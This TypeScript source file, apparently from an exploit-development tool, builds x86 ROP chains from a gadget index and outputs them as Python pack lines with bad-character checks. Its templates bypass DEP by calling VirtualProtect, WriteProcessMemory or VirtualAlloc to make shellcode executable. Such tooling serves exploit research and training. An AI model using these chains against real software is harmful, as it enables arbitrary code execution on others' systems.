import { CapabilityIndex } from "./capabilities";
import { RopGadget } from "./types";

// Native ROP chain construction over the semantic capability index. Covers the
// bread-and-butter case: loading registers with constant values (API argument
// setup). Each target register is written exactly once — via a single-slot xor
// zero, a shared multi-pop, or a single pop — so the chain is clobber-free and
// order-independent. It is a pure evidence emitter: it produces a chain layout as
// text, it does not write target memory.

export interface ChainTarget {
  register: string;
  value: number;
}

export interface ChainStep {
  kind: "gadget" | "value";
  address?: bigint;
  value?: number;
  // When set, this stack word is an operator-supplied placeholder (e.g. a
  // runtime-dependent address) rather than a resolved constant.
  placeholder?: string;
  comment: string;
}

export interface FlatFrameInput {
  value?: number;
  placeholder: string;
  comment: string;
}

export interface FlatFramePlan {
  steps: ChainStep[];
  placeholders: string[];
  badcharViolations: string[];
  warnings: string[];
  badchars: number[];
  stackBytes: number;
}

export interface ChainPlan {
  steps: ChainStep[];
  satisfied: string[];
  unsatisfied: Array<{ register: string; reason: string }>;
  stackBytes: number;
}

function firstKnownAddress(gadget: RopGadget): bigint | undefined {
  const location = gadget.locations.find((entry) => entry.virtualAddress !== undefined);
  return location?.virtualAddress !== undefined ? BigInt(location.virtualAddress) : undefined;
}

function isSinglePopRet(gadget: RopGadget, register: string): boolean {
  if (gadget.instructions.length !== 2) {
    return false;
  }
  const [pop, ret] = gadget.instructions;
  return (
    pop.mnemonic === "pop" &&
    pop.operands.length === 1 &&
    pop.operands[0].trim().toLowerCase() === register &&
    ret.mnemonic === "ret" &&
    ret.operands.length === 0
  );
}

// Pick the best clean single pop gadget for a register: a `pop reg ; ret` with a
// known address, highest-scoring first (scoring already favors short, exact gadgets).
function selectPopGadget(index: CapabilityIndex, register: string): RopGadget | undefined {
  return index
    .loadRegister(register)
    .filter((gadget) => isSinglePopRet(gadget, register) && firstKnownAddress(gadget) !== undefined)
    .sort((a, b) => b.score - a.score)[0];
}

// A `xor reg, reg ; ret` gadget — zeroes reg in a single stack slot with no value.
function isZeroRet(gadget: RopGadget, register: string): boolean {
  if (gadget.instructions.length !== 2) {
    return false;
  }
  const [xor, ret] = gadget.instructions;
  return (
    xor.mnemonic === "xor" &&
    xor.operands.length === 2 &&
    xor.operands[0].trim().toLowerCase() === register &&
    xor.operands[1].trim().toLowerCase() === register &&
    ret.mnemonic === "ret" &&
    ret.operands.length === 0
  );
}

function selectZeroGadget(index: CapabilityIndex, register: string): RopGadget | undefined {
  return index
    .zeroRegister(register)
    .filter((gadget) => isZeroRet(gadget, register) && firstKnownAddress(gadget) !== undefined)
    .sort((a, b) => b.score - a.score)[0];
}

// The register pop order of a `pop R1 ; ... ; pop Rn ; ret` gadget, or undefined
// if the gadget is not a pure pop-sequence terminated by a plain ret.
function popSequenceRegisters(gadget: RopGadget): string[] | undefined {
  const instructions = gadget.instructions;
  if (instructions.length < 2) {
    return undefined;
  }
  const ret = instructions[instructions.length - 1];
  if (ret.mnemonic !== "ret" || ret.operands.length !== 0) {
    return undefined;
  }
  const registers: string[] = [];
  for (let index = 0; index < instructions.length - 1; index += 1) {
    const step = instructions[index];
    if (step.mnemonic !== "pop" || step.operands.length !== 1) {
      return undefined;
    }
    registers.push(step.operands[0].trim().toLowerCase());
  }
  return registers;
}

function valueComment(register: string, value: number): string {
  return `${register} = 0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
}

// Plan a register-setup chain. Each target register is written exactly once, so
// the chain is clobber-free regardless of gadget order. Three passes, cheapest
// first: zero via `xor reg, reg ; ret`; co-satisfy several registers with one
// multi-pop gadget; then a single `pop reg ; ret` per remaining register.
export function planRegisterSetup(index: CapabilityIndex, targets: ChainTarget[]): ChainPlan {
  const steps: ChainStep[] = [];
  const satisfied: string[] = [];
  const unsatisfied: Array<{ register: string; reason: string }> = [];

  const remaining = new Map<string, number>();
  const order: string[] = [];
  for (const target of targets) {
    const register = target.register.trim().toLowerCase();
    if (!remaining.has(register)) {
      order.push(register);
    }
    remaining.set(register, target.value >>> 0);
  }

  // Pass 0: zero registers whose target value is 0 with a single-slot xor gadget.
  for (const register of order) {
    if (remaining.get(register) !== 0) {
      continue;
    }
    const gadget = selectZeroGadget(index, register);
    if (gadget) {
      steps.push({ kind: "gadget", address: firstKnownAddress(gadget)!, comment: `xor ${register}, ${register} ; ret (${register} = 0)` });
      satisfied.push(register);
      remaining.delete(register);
    }
  }

  // Pass 1: co-satisfy with multi-pop gadgets whose popped registers are all
  // distinct and all still-remaining targets (so nothing else is clobbered).
  const popSequences = index.gadgets
    .map((gadget) => ({ gadget, registers: popSequenceRegisters(gadget) }))
    .filter((entry): entry is { gadget: RopGadget; registers: string[] } =>
      entry.registers !== undefined && entry.registers.length >= 2 && firstKnownAddress(entry.gadget) !== undefined);

  let progressed = true;
  while (progressed) {
    progressed = false;
    let best: { gadget: RopGadget; registers: string[] } | undefined;
    for (const candidate of popSequences) {
      const { registers } = candidate;
      const distinct = new Set(registers).size === registers.length;
      if (!distinct || !registers.every((register) => remaining.has(register))) {
        continue;
      }
      if (!best || registers.length > best.registers.length || (registers.length === best.registers.length && candidate.gadget.score > best.gadget.score)) {
        best = candidate;
      }
    }
    if (best) {
      steps.push({ kind: "gadget", address: firstKnownAddress(best.gadget)!, comment: `${best.registers.map((register) => `pop ${register}`).join(" ; ")} ; ret` });
      for (const register of best.registers) {
        const value = remaining.get(register)! >>> 0;
        steps.push({ kind: "value", value, comment: valueComment(register, value) });
        satisfied.push(register);
        remaining.delete(register);
      }
      progressed = true;
    }
  }

  // Pass 2: a single pop ; ret for each register still remaining.
  for (const register of order) {
    if (!remaining.has(register)) {
      continue;
    }
    const gadget = selectPopGadget(index, register);
    if (!gadget) {
      const reason = index.loadRegister(register).length > 0
        ? "only multi-pop or address-less load gadgets available"
        : "no pop gadget found for register";
      unsatisfied.push({ register, reason });
      remaining.delete(register);
      continue;
    }
    const value = remaining.get(register)! >>> 0;
    steps.push({ kind: "gadget", address: firstKnownAddress(gadget)!, comment: `pop ${register} ; ret` });
    steps.push({ kind: "value", value, comment: valueComment(register, value) });
    satisfied.push(register);
    remaining.delete(register);
  }

  return { steps, satisfied, unsatisfied, stackBytes: steps.length * 4 };
}

function hex32(value: bigint | number): string {
  const asBig = typeof value === "bigint" ? value : BigInt(value >>> 0);
  return `0x${asBig.toString(16).toUpperCase().padStart(8, "0")}`;
}

export function formatChainPython(plan: { steps: ChainStep[] }): string[] {
  const lines = ["from struct import pack", 'rop = b""'];
  for (const step of plan.steps) {
    const word = step.kind === "gadget"
      ? hex32(step.address!)
      : step.placeholder ?? hex32(step.value!);
    lines.push(`rop += pack("<I", ${word})  # ${step.comment}`);
  }
  return lines;
}

function uniqueBytes(values: number[] | undefined): number[] {
  const seen = new Set<number>();
  for (const value of values ?? []) {
    if (Number.isInteger(value) && value >= 0 && value <= 0xff) {
      seen.add(value & 0xff);
    }
  }
  return [...seen].sort((a, b) => a - b);
}

function badcharHits(value: number, badchars: number[]): number[] {
  if (badchars.length === 0) {
    return [];
  }
  const bad = new Set(badchars);
  const hits: number[] = [];
  const word = value >>> 0;
  for (let offset = 0; offset < 4; offset += 1) {
    const byte = (word >>> (offset * 8)) & 0xff;
    if (bad.has(byte) && !hits.includes(byte)) {
      hits.push(byte);
    }
  }
  return hits;
}

function byteList(bytes: number[]): string {
  return bytes.map((byte) => `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`).join(", ");
}

function planFlatStdcallFrame(entries: FlatFrameInput[], badchars?: number[]): FlatFramePlan {
  const normalizedBadchars = uniqueBytes(badchars);
  const placeholders = new Set<string>();
  const badcharViolations: string[] = [];
  const warnings: string[] = [];
  const steps = entries.map((entry): ChainStep => {
    if (entry.value === undefined) {
      placeholders.add(entry.placeholder);
      warnings.push(`${entry.placeholder}: placeholder value must be checked against badchars after resolution.`);
      return { kind: "value", placeholder: entry.placeholder, comment: entry.comment };
    }

    const value = entry.value >>> 0;
    const hits = badcharHits(value, normalizedBadchars);
    if (hits.length > 0) {
      badcharViolations.push(`${entry.comment}: ${hex32(value)} contains badchar byte(s) ${byteList(hits)} in little-endian form.`);
    }
    return { kind: "value", value, comment: entry.comment };
  });

  return {
    steps,
    placeholders: [...placeholders],
    badcharViolations,
    warnings: [...warnings, ...badcharViolations],
    badchars: normalizedBadchars,
    stackBytes: steps.length * 4,
  };
}

// ---- Flat stdcall frames ---------------------------------------------------
//
// These emit the simplest DEP-bypass layout: the overwritten return address
// points directly to the API, followed by the API return address and arguments.
// No gadgets or loaded ROP corpus are required. Every argument must be supplied
// explicitly, and every concrete dword can be checked against the caller's
// current bad-character set.

export interface VirtualProtectFrameParams {
  virtualProtect?: number;
  returnAddress?: number;
  lpAddress?: number;
  dwSize?: number;
  flNewProtect?: number;
  writable?: number;
  badchars?: number[];
}

export function planVirtualProtectFrame(params: VirtualProtectFrameParams = {}): FlatFramePlan {
  return planFlatStdcallFrame([
    { value: params.virtualProtect, placeholder: "VIRTUALPROTECT", comment: "ret target: VirtualProtect" },
    { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after VirtualProtect" },
    { value: params.lpAddress, placeholder: "LP_ADDRESS", comment: "lpAddress" },
    { value: params.dwSize ?? 0x201, placeholder: "DW_SIZE", comment: "dwSize" },
    { value: params.flNewProtect ?? 0x40, placeholder: "FL_NEW_PROTECT", comment: "flNewProtect = PAGE_EXECUTE_READWRITE" },
    { value: params.writable, placeholder: "WRITABLE", comment: "lpflOldProtect (writable dummy)" },
  ], params.badchars);
}

export interface WriteProcessMemoryFrameParams {
  writeProcessMemory?: number;
  returnAddress?: number;
  hProcess?: number;
  lpBaseAddress?: number;
  lpBuffer?: number;
  nSize?: number;
  writable?: number;
  badchars?: number[];
}

export function planWriteProcessMemoryFrame(params: WriteProcessMemoryFrameParams = {}): FlatFramePlan {
  return planFlatStdcallFrame([
    { value: params.writeProcessMemory, placeholder: "WRITEPROCESSMEMORY", comment: "ret target: WriteProcessMemory" },
    { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after WriteProcessMemory" },
    { value: params.hProcess ?? 0xffffffff, placeholder: "HPROCESS", comment: "hProcess = GetCurrentProcess() pseudo-handle" },
    { value: params.lpBaseAddress, placeholder: "LP_BASE_ADDRESS", comment: "lpBaseAddress (executable destination)" },
    { value: params.lpBuffer, placeholder: "LP_BUFFER", comment: "lpBuffer (source shellcode)" },
    { value: params.nSize, placeholder: "NSIZE", comment: "nSize" },
    { value: params.writable, placeholder: "WRITABLE", comment: "lpNumberOfBytesWritten (writable dummy)" },
  ], params.badchars);
}

export interface VirtualAllocFrameParams {
  virtualAlloc?: number;
  returnAddress?: number;
  lpAddress?: number;
  dwSize?: number;
  flAllocationType?: number;
  flProtect?: number;
  badchars?: number[];
}

export function planVirtualAllocFrame(params: VirtualAllocFrameParams = {}): FlatFramePlan {
  return planFlatStdcallFrame([
    { value: params.virtualAlloc, placeholder: "VIRTUALALLOC", comment: "ret target: VirtualAlloc" },
    { value: params.returnAddress, placeholder: "RETURN_ADDR", comment: "return address after VirtualAlloc" },
    { value: params.lpAddress, placeholder: "LP_ADDRESS", comment: "lpAddress" },
    { value: params.dwSize ?? 0x201, placeholder: "DW_SIZE", comment: "dwSize" },
    { value: params.flAllocationType ?? 0x1000, placeholder: "FL_ALLOCATION_TYPE", comment: "flAllocationType = MEM_COMMIT" },
    { value: params.flProtect ?? 0x40, placeholder: "FL_PROTECT", comment: "flProtect = PAGE_EXECUTE_READWRITE" },
  ], params.badchars);
}

// ---- PUSHAD goal templates (DEP bypass techniques) -------------------------
//
// Each template expands a classic DEP-bypass into concrete register-setup
// targets, resolves every pop and the pushad;ret gadget from the (live) corpus
// at real addresses, and leaves named placeholders only for genuinely
// runtime-dependent values. They emit chains as evidence — never write target
// memory.
//
// In direct mode, after `pushad ; ret`, the stack (low -> high) is:
//   [EDI] [ESI] [EBP] [ESP] [EBX] [EDX] [ECX] [EAX]
// `ret` pops EDI into EIP, so EDI = the API to call. The remaining 7 words
// form [return_addr(ESI)][param1(EBP)][param2(ESP)][param3(EBX)][param4(EDX)]
// [param5(ECX)][unused(EAX)]. ESP is the saved stack pointer — not directly
// settable, but often "good enough" as a size or address argument.
//
// In RET-slide mode, EDI is a plain `ret` gadget and ESI is the API. That extra
// hop shifts the stdcall frame to [return_addr(EBP)][param1(ESP)][param2(EBX)]
// [param3(EDX)][param4(ECX)][param5(EAX)]. This is the common VirtualProtect
// PUSHAD layout because saved ESP becomes lpAddress and EBX can carry dwSize.

export type PushadDispatchMode = "direct" | "ret-slide";

export interface PushadPlan {
  steps: ChainStep[];
  satisfied: string[];
  unsatisfied: Array<{ register: string; reason: string }>;
  placeholders: string[];
  constraints: string[];
  hasPushad: boolean;
  mode: PushadDispatchMode;
  stackBytes: number;
}

interface RegisterSpec {
  register: string;
  value?: number;
  placeholder?: string;
  missingReason?: string;
  meaning: string;
}

function isPushadRet(gadget: RopGadget): boolean {
  if (gadget.instructions.length !== 2) {
    return false;
  }
  const [pushad, ret] = gadget.instructions;
  return pushad.mnemonic === "pushad" && ret.mnemonic === "ret" && ret.operands.length === 0;
}

function findPushadRet(index: CapabilityIndex): RopGadget | undefined {
  return index.gadgets
    .filter((gadget) => isPushadRet(gadget) && firstKnownAddress(gadget) !== undefined)
    .sort((a, b) => b.score - a.score)[0];
}

function isPlainRet(gadget: RopGadget): boolean {
  return gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0;
}

function findPlainRet(index: CapabilityIndex): RopGadget | undefined {
  return index.gadgets
    .filter((gadget) => isPlainRet(gadget) && firstKnownAddress(gadget) !== undefined)
    .sort((a, b) => b.score - a.score)[0];
}

function named(value: number | undefined, placeholder: string): Pick<RegisterSpec, "value" | "placeholder"> {
  return value === undefined ? { placeholder } : { value: value >>> 0 };
}

function planPushadChain(
  index: CapabilityIndex,
  specs: RegisterSpec[],
  label: string,
  mode: PushadDispatchMode,
  constraints: string[] = [],
): PushadPlan {
  const steps: ChainStep[] = [];
  const satisfied: string[] = [];
  const unsatisfied: Array<{ register: string; reason: string }> = [];
  const placeholders = new Set<string>();

  for (const spec of specs) {
    if (spec.missingReason) {
      unsatisfied.push({ register: spec.register, reason: spec.missingReason });
      continue;
    }
    const gadget = selectPopGadget(index, spec.register);
    if (!gadget) {
      const reason = index.loadRegister(spec.register).length > 0
        ? "only multi-pop or address-less load gadgets available"
        : "no pop gadget found for register";
      unsatisfied.push({ register: spec.register, reason });
      continue;
    }
    steps.push({ kind: "gadget", address: firstKnownAddress(gadget)!, comment: `pop ${spec.register} ; ret` });
    if (spec.placeholder) {
      placeholders.add(spec.placeholder);
      steps.push({ kind: "value", placeholder: spec.placeholder, comment: `${spec.register} = ${spec.placeholder} (${spec.meaning})` });
    } else {
      steps.push({ kind: "value", value: spec.value! >>> 0, comment: `${spec.register} = ${hex32(spec.value!)} (${spec.meaning})` });
    }
    satisfied.push(spec.register);
  }

  const pushad = findPushadRet(index);
  if (pushad) {
    steps.push({ kind: "gadget", address: firstKnownAddress(pushad)!, comment: `pushad ; ret (builds the ${label} call frame and dispatches)` });
  } else {
    unsatisfied.push({ register: "pushad", reason: "no pushad ; ret gadget in corpus" });
  }

  return {
    steps,
    satisfied,
    unsatisfied,
    placeholders: [...placeholders],
    constraints,
    hasPushad: pushad !== undefined,
    mode,
    stackBytes: steps.length * 4,
  };
}

// -- VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect) ----------

export interface VirtualProtectParams {
  virtualProtect?: number;
  retGadget?: number;
  returnAddress?: number;
  lpAddress?: number;
  dwSize?: number;
  writable?: number;
  flNewProtect?: number;
  mode?: PushadDispatchMode;
}

export type VirtualProtectPlan = PushadPlan;

function virtualProtectDirectSpecs(params: VirtualProtectParams): RegisterSpec[] {
  const flNewProtect = (params.flNewProtect ?? 0x40) >>> 0;
  return [
    { register: "edi", ...named(params.virtualProtect, "VIRTUALPROTECT"), meaning: "VirtualProtect (RET dispatches here)" },
    { register: "esi", ...named(params.returnAddress, "RETURN_ADDR"), meaning: "return address after VirtualProtect (e.g. jmp esp)" },
    { register: "ebp", ...named(params.lpAddress, "LP_ADDRESS"), meaning: "lpAddress (shellcode start)" },
    { register: "ebx", value: flNewProtect, meaning: "flNewProtect = PAGE_EXECUTE_READWRITE" },
    { register: "edx", ...named(params.writable, "WRITABLE"), meaning: "lpflOldProtect (writable dummy)" },
    { register: "ecx", ...named(params.writable, "WRITABLE"), meaning: "unused by VirtualProtect (writable)" },
    { register: "eax", value: 0x90909090, meaning: "unused by VirtualProtect (junk)" },
  ];
}

function virtualProtectRetSlideSpecs(params: VirtualProtectParams, retGadget: RopGadget | undefined): RegisterSpec[] {
  const retAddress = params.retGadget !== undefined ? params.retGadget >>> 0 : (retGadget ? Number(firstKnownAddress(retGadget)!) : undefined);
  const dwSize = (params.dwSize ?? 0x201) >>> 0;
  const flNewProtect = (params.flNewProtect ?? 0x40) >>> 0;
  return [
    {
      register: "edi",
      ...(retAddress === undefined ? {} : { value: retAddress }),
      missingReason: retAddress === undefined ? "no plain ret gadget in corpus for RET-slide dispatch" : undefined,
      meaning: "RET-slide gadget (first ret pops ESI into EIP)",
    },
    { register: "esi", ...named(params.virtualProtect, "VIRTUALPROTECT"), meaning: "VirtualProtect (called by RET-slide)" },
    { register: "ebp", ...named(params.returnAddress, "RETURN_ADDR"), meaning: "return address after VirtualProtect (e.g. jmp esp)" },
    { register: "ebx", value: dwSize, meaning: "dwSize" },
    { register: "edx", value: flNewProtect, meaning: "flNewProtect = PAGE_EXECUTE_READWRITE" },
    { register: "ecx", ...named(params.writable, "WRITABLE"), meaning: "lpflOldProtect (writable dummy)" },
    { register: "eax", value: 0x90909090, meaning: "unused by VirtualProtect (junk)" },
  ];
}

export function planVirtualProtect(index: CapabilityIndex, params: VirtualProtectParams = {}): VirtualProtectPlan {
  const mode = params.mode ?? "ret-slide";
  if (mode === "direct") {
    return planPushadChain(index, virtualProtectDirectSpecs(params), "VirtualProtect", "direct", [
      "direct PUSHAD mode uses saved ESP as dwSize; verify the saved stack pointer is an acceptable size argument before using the chain.",
    ]);
  }
  return planPushadChain(index, virtualProtectRetSlideSpecs(params, findPlainRet(index)), "VirtualProtect", "ret-slide", [
    "RET-slide PUSHAD mode uses saved ESP as lpAddress; verify ESP points into the shellcode/NOP sled when pushad executes.",
  ]);
}

// -- WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNBW) ------
// 5 params: ESI=ret, EBP=hProcess, ESP=lpBaseAddress(saved), EBX=lpBuffer,
// EDX=nSize, ECX=lpNumberOfBytesWritten. EAX is unused.

export interface WriteProcessMemoryParams {
  writeProcessMemory?: number;
  returnAddress?: number;
  lpBuffer?: number;
  nSize?: number;
  writable?: number;
}

export type WriteProcessMemoryPlan = PushadPlan;

function writeProcessMemorySpecs(params: WriteProcessMemoryParams): RegisterSpec[] {
  return [
    { register: "edi", ...named(params.writeProcessMemory, "WRITEPROCESSMEMORY"), meaning: "WriteProcessMemory (RET dispatches here)" },
    { register: "esi", ...named(params.returnAddress, "RETURN_ADDR"), meaning: "return address after WPM (e.g. shellcode or jmp esp)" },
    { register: "ebp", value: 0xFFFFFFFF, meaning: "hProcess = GetCurrentProcess() pseudo-handle" },
    { register: "ebx", ...named(params.lpBuffer, "LP_BUFFER"), meaning: "lpBuffer (source — shellcode on stack)" },
    { register: "edx", ...named(params.nSize, "NSIZE"), meaning: "nSize (shellcode byte count)" },
    { register: "ecx", ...named(params.writable, "WRITABLE"), meaning: "lpNumberOfBytesWritten (writable dummy)" },
    { register: "eax", value: 0x90909090, meaning: "unused by WPM (nop sled)" },
  ];
}

export function planWriteProcessMemory(index: CapabilityIndex, params: WriteProcessMemoryParams = {}): WriteProcessMemoryPlan {
  return planPushadChain(index, writeProcessMemorySpecs(params), "WriteProcessMemory", "direct", [
    "direct PUSHAD WriteProcessMemory uses saved ESP as lpBaseAddress; this is only a DEP bypass if that saved ESP is already an executable destination.",
  ]);
}

// -- VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect) -------------
// 4 params: ESI=ret, EBP=lpAddress, ESP=dwSize(saved), EBX=flAllocationType,
// EDX=flProtect. ECX/EAX are unused.

export interface VirtualAllocParams {
  virtualAlloc?: number;
  returnAddress?: number;
  lpAddress?: number;
  flAllocationType?: number;
  flProtect?: number;
}

export type VirtualAllocPlan = PushadPlan;

function virtualAllocSpecs(params: VirtualAllocParams): RegisterSpec[] {
  const flAllocationType = (params.flAllocationType ?? 0x1000) >>> 0;
  const flProtect = (params.flProtect ?? 0x40) >>> 0;
  return [
    { register: "edi", ...named(params.virtualAlloc, "VIRTUALALLOC"), meaning: "VirtualAlloc (RET dispatches here)" },
    { register: "esi", ...named(params.returnAddress, "RETURN_ADDR"), meaning: "return address after VirtualAlloc (e.g. push eax ; ret)" },
    { register: "ebp", ...named(params.lpAddress, "LP_ADDRESS"), meaning: "lpAddress (NULL = OS chooses, or specific address)" },
    { register: "ebx", value: flAllocationType, meaning: `flAllocationType = ${hex32(flAllocationType)} (MEM_COMMIT)` },
    { register: "edx", value: flProtect, meaning: `flProtect = ${hex32(flProtect)} (PAGE_EXECUTE_READWRITE)` },
    { register: "ecx", value: 0x90909090, meaning: "unused by VirtualAlloc (junk)" },
    { register: "eax", value: 0x90909090, meaning: "unused by VirtualAlloc (junk)" },
  ];
}

export function planVirtualAlloc(index: CapabilityIndex, params: VirtualAllocParams = {}): VirtualAllocPlan {
  return planPushadChain(index, virtualAllocSpecs(params), "VirtualAlloc", "direct", [
    "direct PUSHAD VirtualAlloc uses saved ESP as dwSize; verify this size is acceptable or use a different chain shape.",
  ]);
}
